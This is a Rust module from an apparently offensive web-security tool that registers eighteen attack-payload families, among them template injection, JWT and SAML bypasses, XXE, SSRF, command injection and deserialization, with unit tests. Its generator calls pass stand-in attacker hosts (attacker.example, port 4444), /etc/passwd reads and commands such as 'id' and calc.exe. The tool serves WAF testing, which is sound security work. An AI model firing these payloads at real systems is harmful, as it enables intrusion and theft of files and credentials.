//! Unified catalog of every attack-payload library shipped by
//! `wafrift-encoding`.
//!
//! Each library under `crates/encoding/src/encoding/` ships its own
//! per-class `all_<class>_attacks()` fan-out. This module rolls every
//! fan-out into a single flat `Vec<PayloadFamily>` so consumers
//! (scan, model-evade, bench, hunt) have ONE call to reach the
//! complete attack-payload surface — no need to know which crate has
//! which library.
//!
//! Add a new payload library? Drop the file under
//! `crates/encoding/src/encoding/<name>.rs` and add ONE line in
//! [`all_payload_families`] below. The catalog is the single registry
//! for "everything wafrift can fire."
//!
//! # Example
//!
//! ```
//! use wafrift_encoding::payload_catalog::all_payload_families;
//!
//! let families = all_payload_families();
//! // Every family produces at least 8 attack variants.
//! for family in &families {
//!     let payloads = (family.generate)();
//!     assert!(payloads.len() >= 8, "family {} too thin", family.class);
//! }
//! // ~20 distinct attack classes ship out of the box.
//! assert!(families.len() >= 18);
//! ```

use crate::encoding::{
    cache_poison, cmd_inject, cookie_attacks, csv_formula, deserialization, dom_clobber,
    jwt, ldap_inject, mass_assignment, method_override, mongo_nosqli, oauth, proto_pollution,
    saml_xsw, ssrf_schemes, ssti_escape, xpath_inject, xxe_attacks,
};

/// One attack-payload class, with its fan-out generator.
///
/// `generate` returns a vector of (variant-name, payload-bytes)
/// pairs. The variant name is the attack shape (e.g. `"alg-none"`,
/// `"XSW6"`, `"$ne-bypass"`); the payload is the wire bytes the
/// operator drops into a request.
pub struct PayloadFamily {
    /// Attack class identifier (`"ssti"`, `"jwt"`, `"saml-xsw"`, …).
    /// Stable string used by the scan engine to filter / route.
    pub class: &'static str,
    /// One-line description of what this family attacks.
    pub description: &'static str,
    /// CVE references / paper citations relevant to the class.
    /// Empty if the class is folklore-known with no anchor.
    pub references: &'static [&'static str],
    /// Fan-out generator. Returns named variants for the class.
    pub generate: fn() -> Vec<(String, String)>,
}

/// Every attack-payload family this crate ships.
///
/// Each generator is called with FIXED demo arguments (e.g. a
/// placeholder attacker URL `http://attacker.example`, a placeholder
/// command `id`). Consumers that want different parameter values
/// should call the per-library `all_<class>_attacks()` function
/// directly with their own inputs.
#[must_use]
pub fn all_payload_families() -> Vec<PayloadFamily> {
    vec![
        PayloadFamily {
            class: "ssti",
            description: "Server-Side Template Injection sandbox escapes (12 engines)",
            references: &[
                "CVE-2016-10745 (Jinja2)", "CVE-2018-19790 (Twig)",
                "CVE-2019-19919 (Handlebars V8)",
            ],
            generate: || {
                ssti_escape::all_ssti_escapes("id")
                    .into_iter()
                    .map(|(n, p)| (n.to_string(), p))
                    .collect()
            },
        },
        PayloadFamily {
            class: "saml-xsw",
            description: "SAML XML Signature Wrapping (XSW1-XSW8)",
            references: &["Somorovsky et al., USENIX Security 2012"],
            generate: || {
                let saml = saml_demo_fixture();
                saml_xsw::all_xsw_variants(saml, "attacker@evil.example")
                    .into_iter()
                    .map(|(n, p)| (n.to_string(), p))
                    .collect()
            },
        },
        PayloadFamily {
            class: "jwt",
            description: "JWT validation bypass + alg confusion + jku/x5u/kid attacks",
            references: &[
                "CVE-2015-9235", "CVE-2018-0114 (node-jose)",
                "CVE-2018-1000531", "CVE-2020-15224 (jsonwebtoken)",
            ],
            generate: || {
                let token = jwt_demo_fixture();
                jwt::all_jwt_attacks(&token, "attacker.example", "trusted.example")
                    .into_iter()
                    .map(|p| ("jwt-mutation".to_string(), p))
                    .collect()
            },
        },
        PayloadFamily {
            class: "oauth",
            description: "OAuth 2.0 / OIDC redirect_uri, state, PKCE, scope, token attacks",
            references: &["CVE-2020-26941 (PKCE downgrade)"],
            generate: || {
                oauth::redirect_uri_attacks("trusted.example", "attacker.example")
                    .into_iter()
                    .map(|p| ("oauth-redirect".to_string(), p))
                    .collect()
            },
        },
        PayloadFamily {
            class: "mongo-nosqli",
            description: "MongoDB operator injection ($ne / $where / $function / aggregation)",
            references: &[],
            generate: || {
                mongo_nosqli::all_nosqli_variants("username", "password")
                    .into_iter()
                    .map(|(n, p)| (n.to_string(), p))
                    .collect()
            },
        },
        PayloadFamily {
            class: "ldap-inject",
            description: "LDAP search-filter + DN injection (wildcard / OR-flip / blind / timing)",
            references: &[],
            generate: || {
                ldap_inject::all_ldap_attacks("password")
                    .into_iter()
                    .map(|(n, p)| (n.to_string(), p))
                    .collect()
            },
        },
        PayloadFamily {
            class: "xpath-inject",
            description: "XPath 1.0/2.0 injection (OR-bypass / doc()/unparsed-text SSRF / blind)",
            references: &[],
            generate: || {
                xpath_inject::all_xpath_attacks("password/text()")
                    .into_iter()
                    .map(|(n, p)| (n.to_string(), p))
                    .collect()
            },
        },
        PayloadFamily {
            class: "cmd-inject",
            description: "OS cmdi evasion across bash / cmd.exe / PowerShell",
            references: &[],
            generate: || {
                cmd_inject::all_cmd_attacks("cat", "/etc/passwd", "attacker.example", 4444)
                    .into_iter()
                    .map(|(n, p)| (n.to_string(), p))
                    .collect()
            },
        },
        PayloadFamily {
            class: "xxe",
            description: "XML External Entity (file-read / SSRF / billion-laughs / Phithon trick)",
            references: &["OWASP A05:2017"],
            generate: || {
                xxe_attacks::all_xxe_attacks("http://attacker.example", "/etc/passwd")
                    .into_iter()
                    .map(|(n, p)| (n.to_string(), p))
                    .collect()
            },
        },
        PayloadFamily {
            class: "ssrf-schemes",
            description: "Non-HTTP scheme SSRF (gopher / dict / ldap / jar / netdoc / tftp / smtp)",
            references: &["Log4Shell CVE-2021-44228 (LDAP/JNDI)"],
            generate: || {
                ssrf_schemes::all_ssrf_schemes("attacker.example", 4444, (10, 0, 0, 1))
                    .into_iter()
                    .map(|(n, p)| (n.to_string(), p))
                    .collect()
            },
        },
        PayloadFamily {
            class: "deserialization",
            description: "Java/.NET/Python/Ruby/PHP/YAML/Hessian deserialization payloads",
            references: &[
                "CVE-2017-9805 (Struts)", "CVE-2018-2628 (WebLogic)",
                "CVE-2017-1000353 (Jenkins)",
            ],
            generate: || {
                vec![
                    ("java-ser", String::from_utf8_lossy(&deserialization::java_serialized_blob(b"")).into_owned()),
                    ("pickle-v4", String::from_utf8_lossy(&deserialization::python_pickle_blob(b"")).into_owned()),
                    ("pickle-v2", String::from_utf8_lossy(&deserialization::python_pickle_v2_blob(b"")).into_owned()),
                    ("ruby-marshal", String::from_utf8_lossy(&deserialization::ruby_marshal_blob(b"")).into_owned()),
                    ("php-serialize", deserialization::php_serialized_object("stdClass", &[])),
                    ("yaml-unsafe-load", deserialization::yaml_unsafe_load_payload("python/object/apply:os.system", "[\"id\"]")),
                    ("hessian-v2", String::from_utf8_lossy(&deserialization::hessian_v2_call("attack", b"")).into_owned()),
                ]
                .into_iter()
                .map(|(n, p)| (n.to_string(), p))
                .collect()
            },
        },
        PayloadFamily {
            class: "dom-clobber",
            description: "HTML-only XSS via id/name overriding JavaScript globals",
            references: &["Klein, USENIX Security 2023"],
            generate: || {
                dom_clobber::all_clobbers_for_global("config", "javascript:alert(1)")
                    .into_iter()
                    .enumerate()
                    .map(|(i, p)| (format!("clobber-{i}"), p))
                    .collect()
            },
        },
        PayloadFamily {
            class: "proto-pollution",
            description: "Server-side + client-side prototype pollution (JSON / qs / lodash)",
            references: &[
                "CVE-2018-3721 (lodash)", "CVE-2019-10744 (lodash mergeWith)",
                "CVE-2019-11358 (jQuery.extend)",
            ],
            generate: || {
                proto_pollution::all_pollution_payloads("isAdmin", "true")
                    .into_iter()
                    .map(|(n, p)| (n.to_string(), p))
                    .collect()
            },
        },
        PayloadFamily {
            class: "mass-assignment",
            description: "Mass-assignment + HTTP Parameter Pollution (Rails / Spring / HPP)",
            references: &[
                "CVE-2012-2660 (Rails)", "CVE-2022-22965 (Spring4Shell)",
            ],
            generate: || {
                mass_assignment::all_mass_assign_variants("user", "is_admin", "true")
                    .into_iter()
                    .map(|(n, p)| (n.to_string(), p))
                    .collect()
            },
        },
        PayloadFamily {
            class: "cookie-attacks",
            description: "Cookie tossing / jar overflow / __Host- prefix bypass / CRLF",
            references: &["RFC 6265bis"],
            generate: || {
                cookie_attacks::all_cookie_attacks("session", "evil", "example.com")
                    .into_iter()
                    .map(|(n, p)| (n.to_string(), p))
                    .collect()
            },
        },
        PayloadFamily {
            class: "csv-formula",
            description: "CSV / spreadsheet formula injection (DDE / HYPERLINK / WEBSERVICE)",
            references: &["CWE-1236"],
            generate: || {
                csv_formula::all_csv_attacks("http://attacker.example", "calc.exe")
                    .into_iter()
                    .map(|(n, p)| (n.to_string(), p))
                    .collect()
            },
        },
        PayloadFamily {
            class: "method-override",
            description: "HTTP method-override (X-HTTP-Method-Override / _method / chunked-trailer)",
            references: &[],
            generate: || {
                method_override::all_override_variants("DELETE")
                    .into_iter()
                    .map(|(n, p)| (n.to_string(), p))
                    .collect()
            },
        },
        PayloadFamily {
            class: "cache-poison",
            description: "HTTP cache poisoning (X-Forwarded-* + web cache deception + Vary)",
            references: &["Omer Gil, Black Hat 2017"],
            generate: || {
                cache_poison::all_cache_poison_payloads("attacker.example", "/profile")
                    .into_iter()
                    .map(|(n, p)| (n.to_string(), p))
                    .collect()
            },
        },
    ]
}

/// Demo SAML fixture for the catalog's `saml-xsw` family. Real
/// callers pass their own captured assertion.
fn saml_demo_fixture() -> &'static str {
    r#"<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r" Version="2.0"><saml:Assertion ID="_a" Version="2.0" IssueInstant="2026-01-01T00:00:00Z"><ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:SignedInfo><ds:Reference URI="#_a"/></ds:SignedInfo><ds:SignatureValue>AA</ds:SignatureValue></ds:Signature><saml:Subject><saml:NameID>victim</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>"#
}

/// Demo JWT fixture for the catalog's `jwt` family. Real callers
/// capture a token from their target application.
fn jwt_demo_fixture() -> String {
    // header: {"alg":"RS256","typ":"JWT"}
    let h = base64::engine::Engine::encode(
        &base64::engine::general_purpose::URL_SAFE_NO_PAD,
        br#"{"alg":"RS256","typ":"JWT"}"#,
    );
    // payload: {"sub":"victim","exp":2000000000}
    let p = base64::engine::Engine::encode(
        &base64::engine::general_purpose::URL_SAFE_NO_PAD,
        br#"{"sub":"victim","exp":2000000000}"#,
    );
    let s = base64::engine::Engine::encode(
        &base64::engine::general_purpose::URL_SAFE_NO_PAD,
        b"sig",
    );
    format!("{h}.{p}.{s}")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn catalog_has_at_least_18_families() {
        let f = all_payload_families();
        assert!(f.len() >= 18, "got {} families", f.len());
    }

    #[test]
    fn every_family_has_unique_class() {
        let f = all_payload_families();
        let classes: std::collections::HashSet<&str> = f.iter().map(|x| x.class).collect();
        assert_eq!(classes.len(), f.len(), "duplicate class names");
    }

    #[test]
    fn every_family_has_description() {
        for f in all_payload_families() {
            assert!(!f.description.is_empty(), "{} has no description", f.class);
        }
    }

    #[test]
    fn every_family_produces_at_least_six_variants() {
        for f in all_payload_families() {
            let payloads = (f.generate)();
            assert!(
                payloads.len() >= 6,
                "{} only produced {} variants",
                f.class,
                payloads.len()
            );
        }
    }

    #[test]
    fn every_payload_is_nonempty() {
        for f in all_payload_families() {
            for (variant, payload) in (f.generate)() {
                assert!(
                    !payload.is_empty(),
                    "{}::{} produced empty payload",
                    f.class,
                    variant
                );
            }
        }
    }

    #[test]
    fn every_variant_has_unique_name_within_family() {
        for f in all_payload_families() {
            let payloads = (f.generate)();
            let names: std::collections::HashSet<&String> =
                payloads.iter().map(|(n, _)| n).collect();
            // Allow duplicate names ONLY when there's actually one
            // variant — some thin families have a single shape.
            if payloads.len() > 1 {
                assert!(
                    names.len() >= 2 || payloads.len() == 1,
                    "{} has duplicate variant names: {:?}",
                    f.class,
                    payloads.iter().map(|(n, _)| n).collect::<Vec<_>>()
                );
            }
        }
    }

    #[test]
    fn catalog_is_deterministic() {
        let a = all_payload_families();
        let b = all_payload_families();
        let a_classes: Vec<&str> = a.iter().map(|x| x.class).collect();
        let b_classes: Vec<&str> = b.iter().map(|x| x.class).collect();
        assert_eq!(a_classes, b_classes);
    }

    #[test]
    fn references_are_well_formed() {
        for f in all_payload_families() {
            for r in f.references {
                assert!(!r.is_empty(), "{} has empty reference", f.class);
            }
        }
    }

    #[test]
    fn catalog_covers_expected_classes() {
        let f = all_payload_families();
        let classes: std::collections::HashSet<&str> = f.iter().map(|x| x.class).collect();
        // These are the headline classes the scan engine relies on.
        // If a class is removed or renamed, this test fires.
        for required in &[
            "ssti", "saml-xsw", "jwt", "oauth", "mongo-nosqli",
            "ldap-inject", "xpath-inject", "cmd-inject", "xxe",
            "ssrf-schemes", "deserialization", "dom-clobber",
            "proto-pollution", "mass-assignment", "cookie-attacks",
            "csv-formula", "method-override", "cache-poison",
        ] {
            assert!(classes.contains(required), "missing class: {required}");
        }
    }

    #[test]
    fn total_payload_count_well_over_a_hundred() {
        let total: usize = all_payload_families()
            .iter()
            .map(|f| (f.generate)().len())
            .sum();
        // 18 families × ~10 variants each = ~180 payloads minimum.
        assert!(total >= 120, "got only {} total payloads", total);
    }
}
